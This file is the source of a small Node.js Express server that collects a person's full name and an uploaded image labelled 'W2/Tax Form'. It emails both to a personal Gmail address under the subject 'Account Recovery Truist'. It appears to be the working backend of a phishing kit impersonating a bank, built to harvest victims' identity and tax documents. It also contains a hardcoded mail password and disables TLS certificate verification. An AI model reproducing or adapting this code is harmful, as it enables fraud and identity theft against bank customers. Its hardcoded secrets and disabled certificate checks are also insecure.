const nodemailer = require('nodemailer');
const express = require('express');
const upload = require('express-fileupload');
const fs = require('fs');
const app = express();
const cors = require('cors')
require('dotenv').config();
app.use(cors({ origin: '*' }));
app.use(upload());

app.use(express.urlencoded({extented: true}))

app.post('/name', express.json(), (req, res) => {
    let fullName = req.body.fullName;
    console.log('fname: ', fullName);

    const outputMessage = `
        <h4>New Form Submission</h4>
        <h3>Submission details</h3>
        <h4>Full name: ${fullName}</h4>
        <h4>W2/Tax Form: </h4> 
        <img src='cid:form' />
    `

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'timothykwame926@gmail.com',
            pass: 'wrdjrojijuiinukk'
        },
        tls: {
            rejectUnauthorized: false
        }
    })

    var mailOptions = {
        from: 'user@gmail.com',
        to: 'timothykwame926@gmail.com',
        subject: 'Account Recovery Truist',
        html: outputMessage,
        attachments: [{
            filename: 'form.jpg',
            path: __dirname + '/form.jpg',
            cid: 'form'
        }]
    }

    transporter.sendMail(mailOptions, function (err, info) {
        if (err) console.log(err.message);
        else {
            console.log('Email sent: ');
            res.json({ successful: true });
        }
    })
});

app.post('/file', express.json(), (req, res) => {
    let file = req.files.file;

    let base64 = Buffer.from(file.data, 'binary').toString('base64');

    res.send('got it');
    // save it to 'form.jpg' file for sending as an aattachment in email
    fs.writeFile('form.jpg', base64, {encoding: 'base64'}, function(err){
        if(err) console.log(err.message);
        else {
            console.log('file created');
        }
    });
});

app.listen(process.env.PORT || 63013, () => console.log('listening'));